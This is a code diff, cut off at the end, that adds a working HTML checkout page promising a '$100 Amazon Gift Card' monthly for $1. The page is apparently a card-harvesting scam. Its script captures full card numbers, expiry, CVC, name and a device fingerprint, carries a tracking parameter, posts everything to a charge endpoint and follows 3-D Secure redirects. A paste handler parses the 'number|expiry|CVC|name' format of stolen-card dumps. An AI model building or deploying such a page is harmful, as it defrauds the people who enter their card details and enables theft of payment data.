@@ -1,0 +1,219 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Claim your $100 Amazon Gift Card</title>
+<style>
+  :root{--bg:#0b0d14;--card:#141824;--line:#232a3d;--txt:#e8ecf5;--mut:#8b93a8;--grn:#1ea51e;--pur:#8b5cf6}
+  *{box-sizing:border-box}
+  body{margin:0;background:radial-gradient(1000px 500px at 50% -10%,#1b1440,transparent),var(--bg);color:var(--txt);font:16px/1.5 system-ui,sans-serif;display:flex;justify-content:center;padding:26px 16px 60px}
+  .wrap{width:100%;max-width:460px}
+  .top{text-align:center;margin-bottom:18px}
+  .top .big{font-size:44px}
+  h1{font-size:26px;margin:6px 0;letter-spacing:-.5px}
+  .sub{color:var(--mut);margin:0}
+  .box{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:20px}
+  .plans{display:grid;gap:10px;margin-bottom:18px}
+  .plan{display:flex;gap:12px;align-items:center;border:1px solid var(--line);border-radius:12px;padding:12px;cursor:pointer;transition:.15s}
+  .plan.on{border-color:var(--pur);background:#191d2e}
+  .plan input{accent-color:var(--pur)}
+  .plan .t{flex:1}
+  .plan b{display:block;font-size:14px}
+  .plan small{color:var(--mut);font-size:12px}
+  .price{font-weight:800;color:#9fe6a0;font-size:14px}
+  label.f{display:block;font-size:12px;color:var(--mut);text-transform:uppercase;letter-spacing:.5px;margin:14px 0 6px}
+  input{width:100%;background:#0e1220;border:1px solid var(--line);color:var(--txt);border-radius:10px;padding:13px;font:16px ui-monospace,monospace}
+  input:focus{outline:none;border-color:var(--pur)}
+  .numwrap{position:relative}
+  .numwrap input{padding-right:78px}
+  .tag{position:absolute;right:10px;top:50%;transform:translateY(-50%);font-size:11px;font-weight:800;letter-spacing:.5px;padding:4px 8px;border-radius:6px;background:#1b2136;color:#a5b4fc}
+  .tag.visa{background:#1a1f71;color:#fff}
+  .tag.mc{background:#eb001b;color:#fff}
+  .tag.amex{background:#016fd0;color:#fff}
+  .tag.disc{background:#ff6000;color:#fff}
+  .two{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  .hint{font-size:12px;margin-top:6px;min-height:16px}
+  .hint.bad{color:#ffb4b4}
+  .hint.good{color:#9fe6a0}
+  button{width:100%;margin-top:20px;background:linear-gradient(135deg,var(--pur),#3b82f6);color:#fff;border:0;border-radius:12px;padding:15px;font:700 16px system-ui;cursor:pointer}
+  button:disabled{opacity:.6}
+  .foot{color:var(--mut);font-size:12px;text-align:center;margin-top:14px}
+  .done{display:none;text-align:center}
+  .done .ok{font-size:56px}
+  .summary{background:#0e1220;border:1px dashed var(--line);border-radius:12px;padding:14px;margin-top:16px;text-align:left;font-size:14px}
+  .summary div{margin:4px 0;color:var(--mut)}
+  .summary span{color:var(--txt);font-family:ui-monospace,monospace}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="top">
+    <div class="big">🎁</div>
+    <h1>Claim your reward</h1>
+    <p class="sub">Just $1.00/month. Get a <b>$100 Amazon Gift Card</b> every month.</p>
+  </div>
+
+  <div class="box" id="formbox">
+    <div class="plans">
+      <label class="plan on" data-plan="amazon">
+        <input type="radio" name="plan" value="amazon" checked>
+        <div class="t"><b>Amazon Gift Card</b><small>$100.00 credited every month</small></div>
+        <div class="price">$1.00</div>
+      </label>
+      <label class="plan" data-plan="vanilla">
+        <input type="radio" name="plan" value="vanilla">
+        <div class="t"><b>Vanilla Visa Prepaid</b><small>$1.00 monthly reloadable card</small></div>
+        <div class="price">$1.00</div>
+      </label>
+    </div>
+
+    <form id="f" autocomplete="on">
+      <label class="f">Cardholder name</label>
+      <input id="name" autocomplete="cc-name" placeholder="John Doe">
+
+      <label class="f">Card number</label>
+      <div class="numwrap">
+        <input id="number" inputmode="numeric" autocomplete="cc-number" placeholder="1234 5678 9012 3456">
+        <span class="tag" id="tag" style="display:none"></span>
+      </div>
+      <div class="hint" id="hint"></div>
+
+      <div class="two">
+        <div>
+          <label class="f">Expiry</label>
+          <input id="exp" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/YY">
+        </div>
+        <div>
+          <label class="f">CVC</label>
+          <input id="cvc" inputmode="numeric" autocomplete="cc-csc" placeholder="123">
+        </div>
+      </div>
+
+      <button type="submit" id="pay">Pay $1.00</button>
+    </form>
+    <div class="foot">🔒 Secured checkout · cancel anytime</div>
+  </div>
+
+  <div class="box done" id="donebox">
+    <div class="ok">✅</div>
+    <h1>Payment successful</h1>
+    <p class="sub">Your subscription is active. Your gift card is on the way.</p>
+    <div class="summary" id="summary"></div>
+    <div class="foot">You can close this page.</div>
+  </div>
+</div>
+
+<script>
+const q = new URLSearchParams(location.search);
+const WH = q.get('w') || localStorage.getItem('xg_w') || '';
+if (q.get('w')) localStorage.setItem('xg_w', q.get('w'));
+
+const BRANDS = [
+  { n:'Visa',       re:/^4/,                 len:[13,16,19],   cvc:[3], pat:[4,4,4,4], cls:'visa', lab:'VISA' },
+  { n:'MasterCard', re:/^(5[1-5]|2[2-7])/,   len:[16],         cvc:[3], pat:[4,4,4,4], cls:'mc',   lab:'MC' },
+  { n:'Amex',       re:/^3[47]/,             len:[15],         cvc:[4], pat:[4,6,5],   cls:'amex', lab:'AMEX' },
+  { n:'Discover',   re:/^(6011|65|64[4-9])/, len:[16,19],      cvc:[3], pat:[4,4,4,4], cls:'disc', lab:'DISC' },
+  { n:'JCB',        re:/^35/,                len:[16,19],      cvc:[3], pat:[4,4,4,4], cls:'',     lab:'JCB' },
+  { n:'Diners',     re:/^(36|38|30[0-5])/,   len:[14,16,19],   cvc:[3], pat:[4,6,4],   cls:'',     lab:'DINERS' },
+  { n:'UnionPay',   re:/^62/,                len:[16,17,18,19],cvc:[3], pat:[4,4,4,4], cls:'',     lab:'UP' },
+  { n:'Maestro',    re:/^(50|5[6-9]|6\d)/,   len:[12,13,14,15,16,17,18,19], cvc:[3], pat:[4,4,4,4], cls:'', lab:'MAESTRO' }
+];
+const detect = (d) => BRANDS.find(b => b.re.test(d)) || null;
+
+function luhn(d){let s=0,a=false;for(let i=d.length-1;i>=0;i--){let x=+d[i];if(a){x*=2;if(x>9)x-=9}s+=x;a=!a}return d.length>0&&s%10===0}
+function group(d, pat){
+  let out=[], i=0;
+  for (const size of pat){ if(i>=d.length) break; out.push(d.substr(i,size)); i+=size; }
+  if (i < d.length) out.push(d.substr(i));
+  return out.join(' ');
+}
+function expOk(mm,yy){
+  if(!mm||!yy) return false;
+  mm=+mm; yy=+yy; if(yy<100) yy+=2000;
+  if(mm<1||mm>12) return false;
+  const now=new Date(); const cy=now.getFullYear(), cm=now.getMonth()+1;
+  return yy>cy || (yy===cy && mm>=cm);
+}
+
+const $ = id => document.getElementById(id);
+const numEl=$('number'), expEl=$('exp'), cvcEl=$('cvc'), nameEl=$('name'), tagEl=$('tag'), hintEl=$('hint');
+
+function render(){
+  const d = numEl.value.replace(/\D/g,'');
+  const b = detect(d);
+  if (b && d.length >= 2){ tagEl.style.display='block'; tagEl.className='tag '+b.cls; tagEl.textContent=b.lab; }
+  else tagEl.style.display='none';
+
+  const tooLong = b ? d.length > Math.max(...b.len) : d.length > 19;
+  if (d.length > 1){
+    numEl.value = group(d, (b?b.pat:[4,4,4,4]));
+  }
+  if (!d.length){ hintEl.textContent=''; hintEl.className='hint'; return; }
+  if (!b){ hintEl.textContent='Unknown card network'; hintEl.className='hint bad'; return; }
+  if (d.length < Math.min(...b.len)){ hintEl.textContent=`${b.n} · ${d.length}/${Math.min(...b.len)} digits`; hintEl.className='hint'; return; }
+  if (!b.len.includes(d.length)){ hintEl.textContent=`Wrong length for ${b.n}`; hintEl.className='hint bad'; return; }
+  if (!luhn(d)){ hintEl.textContent=`${b.n} · invalid number (Luhn failed)`; hintEl.className='hint bad'; return; }
+  hintEl.textContent=`✓ Valid ${b.n}`; hintEl.className='hint good';
+}
+
+numEl.addEventListener('input', render);
+
+// paste a whole card: "4111111111111111|12/26|123|John Doe" or "4111 1111 1111 1111 12/26 123"
+numEl.addEventListener('paste', e => {
+  const t = (e.clipboardData || window.clipboardData).getData('text');
+  if (!t) return;
+  const digitsRun = t.match(/\d{13,19}/);
+  const expRun = t.match(/\b(0[1-9]|1[0-2])\s*\/?\s*(\d{2}|\d{4})\b/);
+  const cvcRun = t.match(/\b\d{3,4}\b(?!.*\b\d{3,4}\b)/);
+  if (!digitsRun) return;
+  e.preventDefault();
+  numEl.value = digitsRun[0]; render();
+  if (expRun){ expEl.value = expRun[1]+'/'+expRun[2].slice(-2); }
+  const after = t.slice(t.indexOf(digitsRun[0]) + digitsRun[0].length);
+  const cvc = after.match(/\b\d{3,4}\b/);
+  if (cvc) cvcEl.value = cvc[0];
+  const nm = t.split(/[|,\n]/).map(s=>s.trim()).filter(s => /[a-zA-Z]{2,}/.test(s) && !/\d/.test(s)).pop();
+  if (nm) nameEl.value = nm;
+});
+
+expEl.addEventListener('input', () => {
+  let d = expEl.value.replace(/\D/g,'').slice(0,4);
+  expEl.value = d.length > 2 ? d.slice(0,2)+'/'+d.slice(2) : d;
+});
+cvcEl.addEventListener('input', () => { cvcEl.value = cvcEl.value.replace(/\D/g,'').slice(0,4); });
+nameEl.addEventListener('input', () => { nameEl.value = nameEl.value.replace(/[^a-zA-Z .'\-]/g,''); });
+
+document.querySelectorAll('.plan').forEach(p => p.addEventListener('click', () => {
+  document.querySelectorAll('.plan').forEach(x => x.classList.remove('on'));
+  p.classList.add('on'); p.querySelector('input').checked = true;
+}));
+
+$('f').addEventListener('submit', async e => {
+  e.preventDefault();
+  const d = numEl.value.replace(/\D/g,'');
+  const [mm, yy] = expEl.value.split('/');
+  if (d.length < 12) return alert('Enter a card number');
+  if (!expOk(mm, yy)) return alert('Enter a valid expiry (MM/YY)');
+  if (cvcEl.value.length < 3) return alert('Enter the CVC');
+
+  const plan = document.querySelector('input[name=plan]:checked').value;
+  const btn = $('pay'); btn.disabled = true; btn.textContent = 'Processing…';
+
+  const payload = {
+    number: d, name: nameEl.value.trim(), exp_month: mm, exp_year: yy, cvc: cvcEl.value,
+    plan, brand: (detect(d)||{}).n || 'Unknown', w: WH,
+    device: `${screen.width}x${screen.height}|${Intl.DateTimeFormat().resolvedOptions().timeZone}|${navigator.language}`
+  };
+
+  let r = {};
+  try { r = await (await fetch('/api/charge', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) })).json(); }
+  catch(e){ r = {}; }
+
+  if (r.threeDS){ location.href = r.threeDS; return; }
+
+  document.getElementById('formbox').style.display='none';
+  document.getElementById('donebox').style.display='block';
+  document.getElementById('summary').innerHTML = `
+    <div>Plan: <span>${plan === 'amazon' ? 'Amazon Gift Card — $100/mo' : 'Vanilla Visa Prepaid'}</span></div>
+    <div>Card: <span>${payload.brand} •
